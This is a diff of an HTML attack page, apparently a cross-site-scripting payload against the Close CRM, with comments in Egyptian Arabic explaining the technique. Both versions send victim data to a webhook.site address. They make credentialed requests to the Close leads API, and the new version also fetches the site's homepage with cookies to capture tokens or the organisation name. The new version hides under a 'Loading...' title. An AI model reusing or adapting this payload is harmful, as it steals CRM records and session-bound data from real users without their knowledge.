@@ -1,57 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Exfil</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Processing...</h1>
     <script>
-        // 1. محاولة قراءة الـ Referrer المباشر (قد يكون فارغاً)
-        let ref = document.referrer || 'No Referrer';
-
-        // 2. محاولة سرقة رابط التاب الأصلي (الـ CRM) عن طريق window.opener
-        // هذه هي الخدعة الذهبية: نأخذ التاب الأصلي ونحوله لـ Webhook يبتاعنا
-        let openerUrl = 'No Opener';
-        let openedSuccess = false;
-        if (window.opener && !window.opener.closed) {
-            try {
-                // نحاول ناخد الـ URL بتاع التاب الأصلي (الممنوع بسبب CORS، لكننا هنستخدمه في التوجيه)
-                // بما أننا مش هنقدر نقرأه، هنعمل حيلة: نوجه التاب الأصلي لـ Webhook.
-                // وبهذا، الـ Referer اللي هيوصله هو رابط الـ CRM نفسه!
-                window.opener.location = 'https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?method=opener_redirect';
-                openerUrl = 'Redirect initiated';
-                openedSuccess = true;
-            } catch (e) {
-                openerUrl = 'Error: ' + e.message;
-            }
+        // دالة عشان نبعت أي حاجة للـ Webhook
+        function send(data) {
+            fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?log=' + encodeURIComponent(JSON.stringify(data)));
         }
 
-        // 3. محاولة إرسال طلب (fetch) إلى API الـ Close مباشرة من متصفح الضحية
-        // الفكرة: نرسل طلب لـ API، حتى لو منعنا CORS من قراءة الرد، لكن الطلب نفسه هيتنفذ والكوكيز هتروح معاه!
-        // لو API الـ Close مش محمي ضد CSRF، ممكن نحدث بيانات أو نجيبها.
-        let apiResult = 'No API call';
-        // بنحاول نجيب الـ Leads بتاعة المنظمة (المعلومة اللي عندنا)
-        fetch('https://api.close.com/api/v1/lead/?organization=victim_org11', {
-            credentials: 'include' // مهم عشان يبعت الكوكيز الخاصة بالـ CRM
-        }).then(r => r.text()).then(data => {
-            // لو وصلنا هنا (نادراً لأن CORS هيمنع القراءة)، نبعت البيانات.
-            fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?api_data=' + encodeURIComponent(data));
-        }).catch(e => {
-            // لو فشل الطلب بسبب CORS، نبلغ إن الطلب اتبعت على الأقل.
-            fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?api_error=' + encodeURIComponent(e.message));
+        // 1. معلومات المتصفح (زي ما جت)
+        send({
+            ref: document.referrer || 'None',
+            opener: window.opener ? 'Exists' : 'None',
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            ua: navigator.userAgent
         });
 
-        // 4. إرسال كل المعلومات اللي جمعناها (باستثناء API لأنها غير متزامنة) إلى الـ Webhook
-        // نضيف معلومات المتصفح (IP غير ظاهر، لكن نضيف اللغة والوقت)
-        let info = {
-            ref: ref,
-            opener: openerUrl,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            language: navigator.language,
-            userAgent: navigator.userAgent
-        };
+        // 2. الهجوم الجديد: حاول تجيب الـ Leads من API Close
+        // ده طلب GET، حتى لو منع الـ CORS قراءة الرد، الطلب هيتنفذ والكوكيز هتروح.
+        // لو الـ API رجع بيانات، هنقدر نقرأها (لو CORS مسموح)، لكن الأغلب هيرجع خطأ CORS.
+        // لكن ده هيثبت إننا نقدر ننفذ طلبات نيابة عن المستخدم.
+        fetch('https://api.close.com/api/v1/lead/', {
+            credentials: 'include' // عشان يبعت الكوكيز الخاصة بالـ CRM
+        })
+        .then(r => r.text())
+        .then(data => {
+            // لو وصلنا هنا (نادراً)، يبقى الـ CORS مفتوح!
+            send({ api_response: data });
+        })
+        .catch(e => {
+            // لو فشل بسبب CORS، نبعت نوع الخطأ، ده دليل إن الطلب اتبعت على الأقل.
+            send({ api_error: e.message });
+        });
 
-        fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?info=' + encodeURIComponent(JSON.stringify(info)));
+        // 3. جرب تطلب صفحة الـ Dashboard بتاعة الـ CRM (عشان نجيب اسم النطاق)
+        // الفكرة: نحاول نجيب أي ملف من النطاق الرئيسي.
+        fetch('/', { credentials: 'include' })
+        .then(r => r.text())
+        .then(html => {
+            // لو نجح، نبعت أول 100 حرف من الصفحة (قد تحتوي على اسم المنظمة أو التوكنات)
+            send({ homepage_preview: html.substring(0, 200) });
+        })
+        .catch(e => {
+            send({ homepage_error: e.message });
+        });
     </script>
 </body>
 </html>
